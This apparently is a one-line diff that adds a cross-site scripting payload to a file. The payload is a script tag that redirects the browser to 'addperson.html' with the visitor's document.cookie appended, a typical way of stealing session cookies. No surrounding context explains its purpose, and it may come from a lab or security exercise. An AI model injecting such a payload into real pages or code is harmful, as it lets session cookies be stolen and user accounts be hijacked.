@@ -1,0 +1,1 @@
+<script> window.location="addperson.html/?cookie="+document.cookie </script>
